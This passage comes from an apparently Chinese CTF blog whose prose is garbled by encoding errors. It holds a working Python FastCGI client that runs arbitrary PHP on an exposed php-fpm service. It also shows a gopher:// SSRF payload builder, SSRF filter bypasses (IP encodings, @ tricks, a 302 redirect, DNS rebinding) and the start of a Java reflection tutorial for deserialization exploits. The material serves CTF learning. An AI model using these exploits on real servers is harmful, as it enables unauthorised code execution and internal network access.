__FCGI_TYPE_STDIN = 5 __FCGI_TYPE_STDOUT = 6 __FCGI_TYPE_STDERR = 7 __FCGI_TYPE_DATA = 8 __FCGI_TYPE_GETVALUES = 9 __FCGI_TYPE_GETVALUES_RESULT = 10 __FCGI_TYPE_UNKOWNTYPE = 11 __FCGI_HEADER_SIZE = 8 # request state FCGI_STATE_SEND = 1 FCGI_STATE_ERROR = 2 FCGI_STATE_SUCCESS = 3 def __init__(self, host, port, timeout, keepalive): self.host = host self.port = port self.timeout = timeout if keepalive: self.keepalive = 1 else: self.keepalive = 0 self.sock = None self.requests = dict() def __connect(self): self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) self.sock.settimeout(self.timeout) self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1) # if self.keepalive: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1) # else: # self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0) try: self.sock.connect((self.host, int(self.port))) except socket.error as msg: self.sock.close() self.sock = None print(repr(msg)) return False return True def __encodeFastCGIRecord(self, fcgi_type, content, requestid): length = len(content) buf = bchr(FastCGIClient.__FCGI_VERSION) \\ + bchr(fcgi_type) \\ + bchr((requestid &gt;&gt; 8) &amp; 0xFF) \\ + bchr(requestid &amp; 0xFF) \\ + bchr((length &gt;&gt; 8) &amp; 0xFF) \\ + bchr(length &amp; 0xFF) \\ + bchr(0) \\ + bchr(0) \\ + content return buf def __encodeNameValueParams(self, name, value): nLen = len(name) vLen = len(value) record = b'' if nLen &lt; 128: record += bchr(nLen) else: record += bchr((nLen &gt;&gt; 24) | 0x80) \\ + bchr((nLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((nLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(nLen &amp; 0xFF) if vLen &lt; 128: record += bchr(vLen) else: record += bchr((vLen &gt;&gt; 24) | 0x80) \\ + bchr((vLen &gt;&gt; 16) &amp; 0xFF) \\ + bchr((vLen &gt;&gt; 8) &amp; 0xFF) \\ + bchr(vLen &amp; 0xFF) return record + name + value def __decodeFastCGIHeader(self, stream): header = dict() header['version'] = bord(stream[0]) header['type'] = bord(stream[1]) header['requestId'] = (bord(stream[2]) &lt;&lt; 8) + bord(stream[3]) header['contentLength'] = (bord(stream[4]) &lt;&lt; 8) + bord(stream[5]) header['paddingLength'] = bord(stream[6]) header['reserved'] = bord(stream[7]) return header def __decodeFastCGIRecord(self, buffer): header = buffer.read(int(self.__FCGI_HEADER_SIZE)) if not header: return False else: record = self.__decodeFastCGIHeader(header) record['content'] = b'' if 'contentLength' in record.keys(): contentLength = int(record['contentLength']) record['content'] += buffer.read(contentLength) if 'paddingLength' in record.keys(): skiped = buffer.read(int(record['paddingLength'])) return record def request(self, nameValuePairs={}, post=''): if not self.__connect(): print('connect failure! please check your fasctcgi-server !!') return requestId = random.randint(1, (1 &lt;&lt; 16) - 1) self.requests[requestId] = dict() request = b\"\" beginFCGIRecordContent = bchr(0) \\ + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \\ + bchr(self.keepalive) \\ + bchr(0) * 5 request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN, beginFCGIRecordContent, requestId) paramsRecord = b'' if nameValuePairs: for (name, value) in nameValuePairs.items(): name = force_bytes(name) value = force_bytes(value) paramsRecord += self.__encodeNameValueParams(name, value) if paramsRecord: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, b'', requestId) if post: request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId) request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, b'', requestId) self.sock.send(request) self.requests[requestId]['state'] = FastCGIClient.FCGI_STATE_SEND self.requests[requestId]['response'] = b'' return self.__waitForResponse(requestId) def __waitForResponse(self, requestId): data = b'' while True: buf = self.sock.recv(512) if not len(buf): break data += buf data = BytesIO(data) while True: response = self.__decodeFastCGIRecord(data) if not response: break if response['type'] == FastCGIClient.__FCGI_TYPE_STDOUT \\ or response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: if response['type'] == FastCGIClient.__FCGI_TYPE_STDERR: self.requests['state'] = FastCGIClient.FCGI_STATE_ERROR if requestId == int(response['requestId']): self.requests[requestId]['response'] += response['content'] if response['type'] == FastCGIClient.FCGI_STATE_SUCCESS: self.requests[requestId] return self.requests[requestId]['response'] def __repr__(self): return \"fastcgi connect host:{} port:{}\".format(self.host, self.port) if __name__ == '__main__': parser = argparse.ArgumentParser(description='Php-fpm code execution vulnerability client.') parser.add_argument('host', help='Target host, such as 127.0.0.1') parser.add_argument('file', help='A php file absolute path, such as /usr/local/lib/php/System.php') parser.add_argument('-c', '--code', help='What php code your want to execute', default='&lt;?php phpinfo(); exit; ?&gt;') parser.add_argument('-p', '--port', help='FastCGI port', default=9000, type=int) args = parser.parse_args() client = FastCGIClient(args.host, args.port, 3, 0) params = dict() documentRoot = \"/\" uri = args.file content = args.code params = { 'GATEWAY_INTERFACE': 'FastCGI/1.0', 'REQUEST_METHOD': 'POST', 'SCRIPT_FILENAME': documentRoot + uri.lstrip('/'), 'SCRIPT_NAME': uri, 'QUERY_STRING': '', 'REQUEST_URI': uri, 'DOCUMENT_ROOT': documentRoot, 'SERVER_SOFTWARE': 'php/fcgiclient', 'REMOTE_ADDR': '127.0.0.1', 'REMOTE_PORT': '9985', 'SERVER_ADDR': '127.0.0.1', 'SERVER_PORT': '80', 'SERVER_NAME': \"localhost\", 'SERVER_PROTOCOL': 'HTTP/1.1', 'CONTENT_TYPE': 'application/text', 'CONTENT_LENGTH': \"%d\" % len(content), 'PHP_VALUE': 'auto_prepend_file = php://input', 'PHP_ADMIN_VALUE': 'allow_url_include = On' } response = client.request(params, content) åŒæ—¶å¯ä»¥åœ¨vpsæˆ–è€…kaliä¸Šå¼€å¯ç›‘å¬ï¼Œè¿™é‡Œæˆ‘ç”¨kaliç›‘å¬ï¼Œå¹¶ä¸”å°†ç›‘å¬åˆ°çš„æµé‡ç»™äº†1.txt åŒæ—¶æˆ‘ä»¬åœ¨æœ¬åœ°ä¸Šæ‰§è¡Œä¸Šè¿°exp å¾—åˆ°1.txtæˆ‘ä»¬éœ€è¦å¯¹å…¶ä¸­çš„å†…å®¹è¿›è¡Œä¸¤æ¬¡urlç¼–ç  python [è„šæœ¬å] -c [è¦æ‰§è¡Œçš„ä»£ç ] -p [ç«¯å£å·] [ip] [è¦æ‰§è¡Œçš„phpæ–‡ä»¶] import urllib.parse file= open('1.txt','rb') payload= file.read() payload= urllib.parse.quote(payload).replace(\"%0A\",\"%0A%0D\") print(\"gopher://127.0.0.1:9000/_\"+urllib.parse.quote(payload)) å°†å¾—åˆ°çš„å†…å®¹ç›´æ¥ä¼ å…¥urlå³å¯ï¼Œå¦‚ä¸‹å›¾å¯ä»¥çœ‹åˆ°è™½ç„¶ä¹±ç ï¼Œä½†æ˜¯æˆ‘ä»¬çŸ¥é“äº†å½“å‰flagæ–‡ä»¶çš„ä½ç½®äº† æ¥ä¸‹æ¥å°±æ˜¯è¿›è¡Œè¯»å–äº†ï¼Œæ­¥éª¤åŒä¸Šè¿°å³å¯ URL Bypass è‡³äºé‚£ä¸ªæ‰“Redisçš„æ”¾åœ¨å…¶ä»–æ–‡ç« äº†ï¼Œè¿™é‡Œæ‡’å¾—åœ¨å†™ä¸€æ¬¡äº†ã€‚ è¿™é‡Œæ ¹æ®æç¤ºurlåé¢å¿…é¡»ä»¥ä¸Šé¢çš„å¼€å¤´ï¼Œç›´æ¥@ç»•è¿‡ï¼š é‡‡ç”¨httpåŸºæœ¬èº«ä»½è®¤è¯çš„æ–¹å¼ç»•è¿‡ï¼š å¦‚ï¼šhttp://www.aaa.com@www.bbb.com@www.ccc.comï¼Œåœ¨å¯¹@è§£æåŸŸåä¸­ï¼Œä¸åŒçš„å¤„ç†å‡½æ•°å­˜åœ¨å¤„ç†å·®å¼‚ åœ¨PHPçš„parse_urlä¸­ä¼šè¯†åˆ«www.ccc.comï¼Œè€Œlibcurlåˆ™è¯†åˆ«ä¸ºwww.bbb.comã€‚ è¯¦æƒ…å¯å‚è€ƒPHPå®˜æ–¹æ–‡æ¡£ æ„é€ ï¼š?url=http://notfound.ctfhub.com@127.0.0.1/flag.phpå³å¯ æ•°å­—IP Bypass é¢˜ç›®æç¤ºï¼šè¿™æ¬¡banæ‰äº†127ä»¥åŠ172.ä¸èƒ½ä½¿ç”¨ç‚¹åˆ†åè¿›åˆ¶çš„IPäº†ã€‚ä½†æ˜¯åˆè¦è®¿é—®127.0.0.1ã€‚è¯¥æ€ä¹ˆåŠå‘¢ è¿™é‡Œçœ‹åˆ°äº†bançš„ä¿¡æ¯ï¼Œ127ã€172ã€@ã€. å‡è¢«è¿‡æ»¤ï¼Œè¿™é‡Œçœ‹åˆ°ä¸€ä¸ªIPè¿›åˆ¶è½¬æ¢çš„ç½‘å€å¾ˆä¸é”™ï¼š https://tool.520101.com/wangluo/jinzhizhuanhuan/ æˆ‘ä»¬å¯¹ä¸Šè¿°çš„è¿›åˆ¶ä¸€ä¸ªä¸ªå°è¯•ä¸€ä¸‹ï¼Œå‘ç°åè¿›åˆ¶çš„å¯ä»¥åˆ©ç”¨ tipsï¼š 127.0.0.1ï¼šå…«è¿›åˆ¶ï¼š0177.0.0.1åå…­è¿›åˆ¶ï¼š0x7f.0.0.1åè¿›åˆ¶ï¼š2130706433 IPåœ°å€è½¬ä¸ºå…«ã€åã€åå…­è¿›åˆ¶åŠIPåœ°å€çœç•¥å†™æ³•ï¼ˆä»¥ä¸‹å‡ä»£è¡¨127.0.0.1ï¼‰ 0177.00.00.01 2130706433 0x7f.0x0.0x0.0x1 127.1 302è·³è½¬ Bypass é¢˜ç›®æç¤ºï¼šSSRFä¸­æœ‰ä¸ªå¾ˆé‡è¦çš„ä¸€ç‚¹æ˜¯è¯·æ±‚å¯èƒ½ä¼šè·Ÿéš302è·³è½¬ï¼Œå°è¯•åˆ©ç”¨è¿™ä¸ªæ¥ç»•è¿‡å¯¹IPçš„æ£€æµ‹è®¿é—®åˆ°ä½äº127.0.0.1çš„flag.phpå§ æˆ‘ä»¬å…ˆåˆ©ç”¨fileåè®®è¯»å–æºç ï¼š &lt;?php error_reporting(0); if (!isset($_REQUEST['url'])) { header(\"Location: /?url=_\"); exit; } $url = $_REQUEST['url']; if (preg_match(\"/127|172|10|192/\", $url)) { exit(\"hacker! Ban Intranet IP\"); } $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1); curl_exec($ch); curl_close($ch); ä¸è¿‡å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„è¿‡æ»¤å¹¶ä¸å…¨ï¼Œåˆ©ç”¨è¿›åˆ¶è½¬æ¢ä¾æ—§å¯ä»¥ç»•è¿‡ï¼Œä½†æˆ‘ä»¬è¿˜æ˜¯è¦å­¦ä¸€ä¸‹302è·³è½¬çš„ã€‚ åŸç†ï¼šéœ€è¦ä¸€ä¸ªvpsï¼ŒæŠŠ302è½¬æ¢çš„ä»£ç éƒ¨ç½²åˆ°vpsä¸Šï¼Œç„¶åå»è®¿é—®ï¼Œå°±å¯è·³è½¬åˆ°å†…ç½‘ä¸­ï¼ŒæœåŠ¡ç«¯ä»£ç å¦‚ä¸‹ï¼š &lt;?php header(\"Location: http://127.0.0.1/flag.php\"); #è¿™é‡Œè¾“å…¥ä½ æƒ³è¦è®¿é—®çš„å†…ç½‘IP exit(); ?&gt; DNSé‡ç»‘å®š Bypass é¢˜ç›®æç¤ºï¼šå…³é”®è¯ï¼šDNSé‡ç»‘å®šã€‚å‰©ä¸‹çš„è‡ªå·±æ¥å§ï¼Œä¹Ÿè®¸é™„ä»¶ä¸­çš„é“¾æ¥èƒ½æœ‰äº›å¸®åŠ© &lt;?php error_reporting(0); if (!isset($_REQUEST['url'])) { header(\"Location: /?url=_\"); exit; } $url = $_REQUEST['url']; if (preg_match(\"/127|172|10|192/\", $url)) { exit(\"hacker! Ban Intranet IP\"); } $ch = curl_init(); curl_setopt($ch, CURLOPT_URL, $url); curl_setopt($ch, CURLOPT_HEADER, 0); curl_exec($ch); curl_close($ch); æºç æ²¡å˜ï¼Œä¾ç…§é¢˜ç›®çš„æ„æ€ï¼šæˆ‘ä»¬çŸ¥é“æˆ‘ä»¬åœ¨è¾“å…¥åŸŸåçš„æ—¶å€™ï¼Œå¯¹æ–¹çš„DNSæœåŠ¡å™¨ä¼šå°†å…¶è§£æä¸ºå¯¹åº”IPåœ°å€ï¼Œéšååˆ¤æ–­IPåœ°å€æ˜¯å¦å®‰å…¨ï¼Œå¦‚æœå®‰å…¨åœ¨curlå»è¯·æ±‚è¿™ä¸ªIPåœ°å€ï¼Œä½†ä»è¿™ä¸ªè§£æåˆ¤æ–­åˆ°curlè¯·æ±‚çš„è¿‡ç¨‹ä¸­æœ‰ä¸€ä¸ªæ—¶é—´å·®ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥æ—¶é—´å·®è¿›è¡Œæ”»å‡»ã€‚ å…ˆæä¸€ä¸ªåŸŸåè®©å…¶è§£æçš„IPåœ°å€ä¸ºä¸€ä¸ªå®‰å…¨çš„ï¼Œéšååœ¨å¯¹æ–¹æœåŠ¡å™¨æˆåŠŸè§£æå¹¶åˆ¤æ–­IPå®‰å…¨ä¹‹åï¼Œåœ¨å°†åŸŸåç»‘å®šä¸º127.0.0.1ç­‰å†…ç½‘IPï¼ŒéšåæˆåŠŸç»•è¿‡é™åˆ¶è€Œè¢«curlå»è¯·æ±‚ã€‚è¿™é‡Œç”¨åˆ°ä¸ªç½‘ç«™ï¼š https://lock.cmpxchg8b.com/rebinder.html ç®€å•æ¥è¯´æˆ‘ä»¬åœ¨ä¸Šé¢å†™ä¸€ä¸ªæ­£å¸¸IPï¼Œå’Œä¸€ä¸ªéæ­£å¸¸IPï¼Œæ¥ç€è¿™ä¸ªç½‘ç«™ä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªTTLå€¼å¾ˆä½çš„åŸŸåï¼Œè¿™æ„å‘³ç€è¯¥DNSè®°å½•åœ¨DNSæœåŠ¡å™¨ä¸Šçš„ç¼“å­˜æ—¶é—´å°±å¾ˆå°ï¼Œå¯¼è‡´ä¿®æ”¹è®°å½•ä¹‹ååœ¨å„åœ°çš„ç”Ÿæ•ˆæ—¶é—´åŠ å¿«ã€‚ æ„å‘³ç€å¦‚æœæˆ‘ä»¬ä¸´æ—¶æ”¹å˜åŸŸåæŒ‡å‘çš„IPï¼Œä»–ä¼šå¾ˆå¿«çŸ¥æ‚‰åˆ°è¿™ä¸ªåŸŸåè§£æå˜åŒ–ï¼Œå¹¶é¡ºåº”æˆ‘ä»¬çš„æ”¹å˜å¿«é€Ÿå°†åŸŸåè§£æåˆ°å…¶ä»–IPã€‚ å…·ä½“å¯å‚è€ƒï¼šhttps://zhuanlan.zhihu.com/p/89426041 0x03 å‚è€ƒæ–‡ç«  httpåè®®å‚è€ƒï¼šHTTP/1.1è¯¦è§£ CTFHub-Web-ä¿¡æ¯æ³„éœ²-Gitæ³„éœ² å‘½ä»¤æ³¨å…¥â€“ç®¡é“ç¬¦å‘½ä»¤çš„è§£é‡Šå‚è€ƒ CTFHubæŠ€èƒ½æ ‘ Web-SSRF POSTè¯·æ±‚ CTFHubæŠ€èƒ½æ ‘ç¬”è®°ä¹‹SSRFï¼šPOSTè¯·æ±‚ã€æ–‡ä»¶ä¸Šä¼  SSRFè¯¦è§£ åŸºäºCTFHubï¼ˆä¸Šç¯‡ï¼‰","tags":["CTFèµ›äº‹"],"categories":["CTFHubç³»åˆ—"]},{"title":"Javaååºåˆ—åŒ–1å…¥é—¨","path":"/2023/12/09/java-fan-xu-lie-hua-1/","content":"0x01 å‰è¨€ å¦‚ä»ŠCTFæ¯”èµ›ä¸­éš¾é¢˜æˆ–è€…æ˜¯å‹è½´é¢˜éƒ½æ¶‰åŠåˆ°JavaçŸ¥è¯†ï¼Œå¯è§Javaå®‰å…¨çš„ç«çˆ†ç¨‹åº¦ï¼Œå¦‚ä»Šçœ‹äº†å°è¿ªçš„æ¶‰åŠåˆ°Javaååºåˆ—åŒ–1çš„è¯¾ç¨‹ï¼Œä¹Ÿæƒ³ç€æ˜¯æ—¶å€™åˆæ­¥å­¦ä¹ ä¸€ä¸‹äº†ã€‚æ•…æ­¤æ–‡ç« ç”¨æ¥å…¥é—¨Javaååºåˆ—åŒ–1ï¼Œåç»­é‡åˆ°æ–°çŸ¥è¯†åœ¨å†™å§ã€‚ 0x02 Javaåå°„ è·Ÿç€å¸ˆå‚…çš„è·¯çº¿å…ˆäº†è§£ä¸€ä¸‹Javaåå°„ Javaæ­£å°„ ä¾‹å­ï¼Œè¿™æ˜¯ä¸€ä¸ªpersonç±»ï¼Œæœ‰æˆå‘˜å˜é‡ä»¥åŠå‡½æ•°ï¼š package åå°„; public class Person { private String name; private int age; public String getName() { return name; } public void setName(String name) { this.name = name; } public int getAge() { return age; } public void setAge(int age) { this.age = age; } public void show(){ System.out.println(\"hello\"); } } æˆ‘ä»¬åœ¨ç¼–å†™ä»£ç æ—¶ï¼Œå½“éœ€è¦ä½¿ç”¨åˆ°æŸä¸€ä¸ªç±»çš„æ—¶å€™ï¼Œéƒ½ä¼šå…ˆäº†è§£è¿™ä¸ªç±»æ˜¯åšä»€ä¹ˆçš„ã€‚ç„¶åå®ä¾‹åŒ–è¿™ä¸ªç±»ï¼Œæ¥ç€ç”¨å®ä¾‹åŒ–å¥½çš„å¯¹è±¡è¿›è¡Œæ“ä½œï¼Œè¿™å°±æ˜¯æ­£å°„ã€‚ package åå°„; import åå°„.Person; public class æ­£å°„ { public static void main(String[] args) { Person person1 =new Person(); person1.setName(\"å°æ˜\"); person1.setAge(18); System.out.println(person1.getName()); System.out.println(person1.getAge()); Class c = person1.getClass();//Class ç±»çš„å¯¹è±¡ä½œç”¨æ˜¯è¿è¡Œæ—¶æä¾›æˆ–è·å¾—æŸä¸ªå¯¹è±¡çš„ç±»å‹ä¿¡æ¯ã€‚ System.out.println(c); person1.show(); } } Javaåå°„æœºåˆ¶ Javaåå°„(Reflection)æ˜¯Javaéå¸¸é‡è¦çš„åŠ¨æ€ç‰¹æ€§ï¼Œé€šè¿‡ä½¿ç”¨åå°„æˆ‘ä»¬ä¸ä»…å¯ä»¥è·å–åˆ°ä»»ä½•ç±»çš„æˆå‘˜æ–¹æ³•(Methods)ã€æˆå‘˜å˜é‡(Fields)ã€æ„é€ æ–¹æ³•(Constructors)ç­‰ä¿¡æ¯ï¼Œè¿˜å¯ä»¥åŠ¨æ€åˆ›å»ºJavaç±»å®ä¾‹ã€è°ƒç”¨ä»»æ„çš„ç±»æ–¹æ³•ã€ä¿®æ”¹ä»»æ„çš„ç±»æˆå‘˜å˜é‡å€¼ç­‰ã€‚Javaåå°„æœºåˆ¶æ˜¯Javaè¯­è¨€çš„åŠ¨æ€æ€§çš„é‡è¦ä½“ç°ï¼Œä¹Ÿæ˜¯Javaçš„å„ç§æ¡†æ¶åº•å±‚å®ç°çš„çµé­‚ã€‚ Java åå°„ç»„æˆç›¸å…³çš„ç±» åå°„æœºåˆ¶ç›¸å…³æ“ä½œä¸€èˆ¬ä½äºjava.lang.reflectåŒ…ä¸­ï¼Œè€Œjavaåå°„æœºåˆ¶ç»„æˆéœ€è¦é‡ç‚¹æ³¨æ„ä»¥ä¸‹çš„ç±»ï¼š java.lang.Classï¼šç±»å¯¹è±¡; java.lang.reflect.Constructorï¼šç±»çš„æ„é€ å™¨å¯¹è±¡; java.lang.reflect.Fieldï¼šç±»çš„å±æ€§å¯¹è±¡; java.lang.reflect.Methodï¼šç±»çš„æ–¹æ³•å¯¹è±¡; åå°„è°ƒç”¨æ–¹æ³•ï¼š è·å–ç±»çš„æ–¹æ³•ï¼šforName å®ä¾‹åŒ–ç±»å¯¹è±¡çš„æ–¹æ³•ï¼šnewInstance è·å–å‡½æ•°çš„æ–¹æ³•ï¼šgetMethod æ‰§è¡Œå‡½æ•°çš„æ–¹æ³•ï¼šinvoke è·å–Classå¯¹è±¡ Class ç±»æ˜¯æè¿°ç±»çš„ç±»ï¼Œä½œç”¨æ˜¯è¿è¡Œæ—¶æä¾›æˆ–è·å¾—æŸä¸ªå¯¹è±¡çš„ç±»å‹ä¿¡æ¯ã€‚ è·å–ç±»çš„å®ä¾‹æœ‰ä»¥ä¸‹çš„ä¸‰ç§æ–¹æ³•ï¼š æ–¹æ³•ä¸€ã€å®ä¾‹åŒ–å¯¹è±¡çš„getClass()æ–¹æ³• å¦‚æœä¸Šä¸‹â½‚ä¸­å­˜åœ¨æŸä¸ªç±»çš„å®ä¾‹ objï¼Œé‚£ä¹ˆæˆ‘ä»¬å¯ä»¥é€šè¿‡ obj.getClass æ¥è·å–å®ƒçš„ç±»ã€‚ TestReflection testReflection = new TestReflection(); Class class1 = testReflection.getClass(); æ–¹æ³•äºŒã€ ä½¿ç”¨ç±»çš„ .class æ–¹æ³• å¦‚æœä½ å·²ç»åŠ è½½äº†æŸä¸ªç±»ï¼Œåªæ˜¯æƒ³è·å–åˆ°å®ƒçš„ java.lang.Class å¯¹è±¡ï¼Œé‚£ä¹ˆå°±ç›´æ¥æ‹¿å®ƒçš„ class å±æ€§å³å¯ã€‚è¿™ä¸ªâ½…æ³•å…¶å®ä¸å±äºåå°„ã€‚ Class class2 = TestReflection.class; æ–¹æ³•ä¸‰ã€Class.forName(String className)ï¼šåŠ¨æ€åŠ è½½ç±» å¦‚æœä½ çŸ¥é“æŸä¸ªç±»çš„åå­—ï¼Œæƒ³è·å–åˆ°è¿™ä¸ªç±»ï¼Œå°±å¯ä»¥ä½¿â½¤ forName æ¥è·å– Class class3 = Class.forName(\"reflection.TestReflection\"); æˆ‘ä»¬å¯ä»¥å†™ä¸ªç®€å•çš„ç¤ºä¾‹ä»£ç ï¼Œåˆ†åˆ«åˆ©ç”¨è¿™ä¸‰ç§æ–¹æ³•è·å–å½“å‰ç±»Classå¯¹è±¡çš„å½“å‰ç±»åã€‚ æ­¤å¤–è¿˜æœ‰ä¸€ç§è·å–ç±»classçš„æ–¹æ³•ï¼šclassLoader.loadClass(\"com.anbai.sec.classloader.TestReflection\"); package åå°„; import åå°„.Person; public class Reflect{ public static void main(String[] args) throws Exception{ // ç±»çš„ .class å±æ€§ Class c1 = Person.class; System.out.println(c1.getName()); // å®ä¾‹åŒ–å¯¹è±¡çš„ getClass() æ–¹æ³• Person person = new Person(); Class c2 = person.getClass(); System.out.println(c2.getName()); // Class.forName(String className): åŠ¨æ€åŠ è½½ç±» Class c3 = Class.forName(\"åå°„.Person\"); System.out.println(c3.getName()); } } æˆ‘ä»¬ä¸€èˆ¬ä½¿ç”¨ç¬¬ä¸‰ç§é€šè¿‡Class.forNameæ–¹æ³•å»åŠ¨æ€åŠ è½½ç±»ã€‚ä¸”ä½¿ç”¨forNameå°±ä¸éœ€è¦importå¯¼å…¥å…¶ä»–ç±»ï¼Œå¯ä»¥åŠ è½½æˆ‘ä»¬ä»»æ„çš„ç±»ã€‚ è€Œä½¿ç”¨ç±».classå±æ€§ï¼Œéœ€è¦å¯¼å…¥ç±»çš„åŒ…ï¼Œä¾èµ–æ€§å¤ªå¼ºï¼Œåœ¨å¤§å‹é¡¹ç›®ä¸­å®¹æ˜“æŠ›å‡ºç¼–è¯‘é”™è¯¯ï¼› è€Œä½¿ç”¨å®ä¾‹åŒ–å¯¹è±¡çš„getClass()æ–¹æ³•ï¼Œéœ€è¦æœ¬èº«åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œæœ¬èº«å°±æ²¡æœ‰äº†ä½¿ç”¨åå°„æœºåˆ¶æ„ä¹‰ã€‚ æ‰€ä»¥æˆ‘ä»¬åœ¨è·å–classå¯¹è±¡ä¸­ï¼Œä¸€èˆ¬ä½¿ç”¨Class.forNameæ–¹æ³•å»è·å–ã€‚ åå°„å¸¸ç”¨å‡½æ•° getMethod()æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­æ‰€æœ‰å…¬å…±(public)æ–¹æ³•ã€‚åŒ…æ‹¬ä»çˆ¶ç±»é‡Œç»§æ‰¿æ¥çš„æ–¹æ³•ã€‚ getDeclaredMethod()ç³»åˆ—æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»ä¸­â€œå£°æ˜â€çš„æ–¹æ³•ï¼ŒåŒ…æ‹¬privateï¼Œprotected å’Œpublicï¼Œä¸åŒ…å«ä»çˆ¶ç±»ç»§æ‰¿æ¥çš„æ–¹æ³•ã€‚ getConstructor()æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»å£°æ˜ä¸ºå…¬å…±(public)æ„é€ å‡½æ•°å®ä¾‹ã€‚ getDeclaredConstructor()æ–¹æ³•è·å–çš„æ˜¯å½“å‰ç±»å£°æ˜çš„æ„é€ å‡½æ•°å®ä¾‹ï¼ŒåŒ…æ‹¬privateï¼Œ protectedå’Œpublicã€‚ setAccessible()åœ¨è·å–åˆ°ç§æœ‰æ–¹æ³•æˆ–æ„é€ æ–¹æ³•åï¼Œä½¿ç”¨ setAccessible(true)ï¼Œæ”¹å˜å…¶ä½œç”¨åŸŸï¼Œè¿™æ ·å³ä½¿æ˜¯ç§æœ‰çš„å±æ€§ï¼Œæ–¹æ³•ï¼Œæ„é€ å‡½æ•°ä¹Ÿéƒ½å¯ä»¥è®¿é—®è°ƒç”¨äº† newInstance()å°†è·å–åˆ°çš„å¯¹è±¡å®ä¾‹åŒ–ã€‚è°ƒç”¨çš„æ˜¯è¿™ä¸ªç±»çš„æ— å‚æ„é€ å‡½æ•°ã€‚ä½¿ç”¨ newInstance ä¸æˆåŠŸçš„è¯å¯èƒ½æ˜¯å› ä¸ºï¼šâ‘ ã€ä½ ä½¿ç”¨çš„ç±»æ²¡æœ‰æ— å‚æ„é€ å‡½æ•°ï¼Œâ‘¡ã€ä½ ä½¿ç”¨çš„ç±»æ„é€ å‡½æ•°æ˜¯ç§æœ‰çš„ã€‚ invoke()è°ƒç”¨åŒ…è£…åœ¨å½“å‰Methodå¯¹è±¡ä¸­çš„æ–¹æ³•ã€‚ é€šè¿‡åå°„åˆ›å»ºç±»å¯¹è±¡ é€šè¿‡åå°„åˆ›å»ºç±»å¯¹è±¡ä¸»è¦æœ‰ä¸¤ç§æ–¹å¼ï¼šé€šè¿‡ Class å¯¹è±¡çš„ newInstance() æ–¹æ³•ã€é€šè¿‡ Constructor å¯¹è±¡çš„ newInstance() æ–¹æ³•ã€‚ ç¬¬ä¸€ç§ï¼šé€šè¿‡ Class å¯¹è±¡çš„ newInstance() æ–¹æ³•ã€‚ Class clz = Apple.class; Apple apple = (Apple)clz.newInstance(); ç¬¬äºŒç§ï¼šé€šè¿‡ Constructor å¯¹è±¡çš„ newInstance() æ–¹æ³• Class clz = Apple.class; Constructor constructor = clz.getConstructor(); Apple apple = (Apple)constructor.newInstance(); é€šè¿‡ Constructor å¯¹è±¡åˆ›å»ºç±»å¯¹è±¡å¯ä»¥é€‰æ‹©ç‰¹å®šæ„é€ æ–¹æ³•ï¼Œè€Œé€šè¿‡ Class å¯¹è±¡åˆ™åªèƒ½ä½¿ç”¨é»˜è®¤çš„æ— å‚æ•°æ„é€ æ–¹æ³•ã€‚ä¸‹é¢çš„ä»£ç å°±è°ƒç”¨äº†ä¸€ä¸ªæœ‰å‚æ•°çš„æ„é€ æ–¹æ³•è¿›è¡Œäº†ç±»å¯¹è±¡çš„åˆå§‹åŒ–ã€‚ Class clz = Apple.class; Constructor constructor = clz.getConstructor(String.class, int.class); Apple apple = (Apple)constructor.newInstance(\"çº¢å¯Œå£«\", 15); newInstance() è¯¥æ–¹æ³•å±äº Class ç±»ï¼Œæ‰§è¡Œåè¿”å›ä¸€ä¸ª Objectï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–¹æ³•æ¥å®ä¾‹åŒ–å¯¹åº”çš„ç±»ï¼Œä½œç”¨å°±æ˜¯è°ƒç”¨è¿™ä¸ªç±»çš„æ— å‚æ„é€ å‡½æ•°ã€‚ä½†è¦æ±‚è¦å®ä¾‹åŒ–çš„ç±»å¿…é¡»è¦æœ‰æ— å‚æ„é€ å‡½æ•°ï¼Œå¹¶ä¸”è¿™ä¸ªæ„é€ å‡½æ•°ä¸æ˜¯ç§æœ‰çš„ã€‚ Runtimeç±»çš„åˆ†æ è¿›å…¥ Runtime ç±»ä¸­å¯ä»¥çœ‹åˆ° è¿™é‡Œå¯ä»¥çœ‹åˆ°Runtimeç±»ä¸ºå•ä¾‹æ¨¡å¼ï¼Œè¿™æ„å‘³ç€æˆ‘ä»¬åªèƒ½é€šè¿‡getRuntimeæ–¹æ³•æ¥è·å–Runtimeå¯¹è±¡ã€‚åŒæ—¶æ³¨æ„ getRuntime å¯¹è±¡æ˜¯é™æ€æ–¹æ³•ï¼Œå³å¯ä»¥ç›´æ¥é€šè¿‡ ç±»å.æ–¹æ³•å çš„æ–¹æ³•è°ƒç”¨ã€‚ javaæ‰§è¡Œå‘½ä»¤ Runtime run = Runtime.getRuntime();//è·å– Runtime å¯¹è±¡ run.exec(\"calc\");//æ‰§è¡Œcalcå‘½ä»¤å¼¹å‡ºè®¡ç®—å™¨ getMethod() è¯¥æ–¹æ³•å¯è·å–ä¸€ä¸ª Method 